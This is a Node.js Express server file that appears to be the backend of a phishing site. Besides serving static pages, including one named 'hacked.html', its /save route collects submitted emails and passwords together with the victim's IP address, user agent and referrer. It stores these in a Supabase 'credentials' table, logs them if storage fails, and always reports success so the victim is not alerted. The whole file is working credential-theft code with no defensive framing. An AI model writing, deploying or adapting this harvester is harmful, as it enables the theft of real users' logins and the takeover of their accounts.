const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const fs = require('fs');
const path = require('path');

const app = express();

// Supabase setup with error handling
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
let supabase = null;

console.log('Supabase URL:', supabaseUrl ? 'Set' : 'NOT SET');
console.log('Supabase Key:', supabaseKey ? 'Set' : 'NOT SET');

if (supabaseUrl && supabaseKey) {
  try {
    supabase = createClient(supabaseUrl, supabaseKey);
    console.log('Supabase client initialized successfully');
  } catch (error) {
    console.error('Failed to initialize Supabase:', error.message);
  }
}

// Middleware to parse JSON
app.use(express.json());

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    supabase_configured: !!supabase,
    supabase_url: supabaseUrl ? 'Set' : 'NOT SET',
    supabase_key: supabaseKey ? 'Set' : 'NOT SET'
  });
});

// Root route - serve index.html
app.get('/', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'index.html');
    const html = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error('Error reading index.html:', error);
    res.status(500).send('Error loading page');
  }
});

// Serve hacked.html
app.get('/hacked.html', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'hacked.html');
    const html = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error('Error reading hacked.html:', error);
    res.status(404).send('Page not found');
  }
});

// Serve CSS
app.get('/style.css', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'style.css');
    const css = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/css');
    res.send(css);
  } catch (error) {
    console.error('Error reading style.css:', error);
    res.status(404).send('CSS not found');
  }
});

// Serve assets
app.get('/assets/:filename', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'assets', req.params.filename);
    res.sendFile(filePath);
  } catch (error) {
    console.error('Error reading asset:', error);
    res.status(404).send('Asset not found');
  }
});

// Serve app.js
app.get('/app.js', (req, res) => {
  try {
    const filePath = path.join(process.cwd(), 'app.js');
    const js = fs.readFileSync(filePath, 'utf8');
    res.set('Content-Type', 'text/javascript');
    res.send(js);
  } catch (error) {
    console.error('Error reading app.js:', error);
    res.status(404).send('JS not found');
  }
});

// Route to save credentials
app.post('/save', async (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent');
  const referrer = req.get('Referer');

  const credentialData = { email, password, timestamp, ip, user_agent: userAgent, referrer };
  let saved = false;

  // Try to save to Supabase if configured
  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('credentials')
        .insert([credentialData]);

      if (error) {
        console.error('Supabase error:', error);
      } else {
        console.log('Credentials saved to Supabase');
        saved = true;
      }
    } catch (error) {
      console.error('Exception saving to Supabase:', error.message);
    }
  } else {
    console.warn('Supabase not configured - please set SUPABASE_URL and SUPABASE_ANON_KEY on Vercel');
  }

  if (!saved) {
    console.log('Credential captured (Supabase offline):', email);
  }

  // Always return success and redirect
  res.json({ success: true, message: 'Credentials processed' });
});

module.exports = app;
